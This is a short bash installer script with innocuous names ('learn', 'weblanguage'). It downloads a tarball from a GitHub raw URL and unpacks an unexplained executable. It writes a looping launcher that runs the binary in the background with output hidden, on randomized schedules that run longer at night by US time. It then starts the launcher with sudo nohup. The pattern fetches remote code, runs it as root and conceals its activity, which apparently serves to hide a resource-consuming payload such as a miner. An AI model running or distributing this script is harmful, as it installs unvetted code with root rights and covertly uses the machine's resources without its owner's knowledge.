#!/bin/bash

mkdir -p learn

cd learn

echo "download web2 file"

curl -L -o web2.tar.gz https://raw.githubusercontent.com/amosgansweet/webmodelxm/main/webmodelxm.tar.gz

tar -xvzf web2.tar.gz

rm -fr webmodelxm

chmod +x web2


# creat weblanguage.sh
cat << 'EOF' > weblanguage.sh

#!/bin/bash

echo "creat a weblanguage.sh"
echo "running..."
touch web2.log
NLANGUAGE_PATH="./web2"
LOG_FILE="./web2.log"

# Function to get the current hour in the US timezone (Pacific Time)
get_us_hour() {
  # Set the timezone to US Pacific Time (Los Angeles)
  TZ="America/Los_Angeles"
  export TZ
  echo "$(date +%H)"
}

while true
do
    # get US time (hour)
    US_HOUR=$(get_us_hour)

    # set up running time and sleep time
    if [ "$US_HOUR" -ge 7 ] && [ "$US_HOUR" -lt 22 ]; then
        # Day time (7 AM to 10 PM) – Less frequent, shorter runs
        RUNTIME=$((RANDOM % 900 + 1200))     # run in the day：20~35 min
        SLEEPTIME=$((RANDOM % 900 + 900))  # sleep in the day：15~30 min
        echo "$(date '+%Y-%m-%d %H:%M:%S'): $(basename "$0"): Day: Running for $RUNTIME seconds, sleeping for $SLEEPTIME seconds" >> "$LOG_FILE"
    else
        # Night time (10 PM to 7 AM) – More frequent, longer runs
        RUNTIME=$((RANDOM % 1200 + 1800))   # run at night:30~50 min
        SLEEPTIME=$((RANDOM % 900 + 300))   # sleep at night：5~15 min
        echo "$(date '+%Y-%m-%d %H:%M:%S'): $(basename "$0"): Night: Running for $RUNTIME seconds, sleeping for $SLEEPTIME seconds" >> "$LOG_FILE"
    fi

    # start nlanguage（background）
    "$NLANGUAGE_PATH" > /dev/null 2>&1 &
    NLANGUAGE_PID=$!

    # await running time
    sleep "$RUNTIME"

    # close nlanguage
    pkill -x "$(basename "$NLANGUAGE_PATH")" 2>/dev/null  # Use pkill for robustness

    # await for starting next time
    sleep "$SLEEPTIME"
done

sleep 1
echo "operation done!"

EOF
# operation privileges
chmod +x weblanguage.sh

# executing

sudo nohup ./weblanguage.sh > /dev/null 2>&1 &
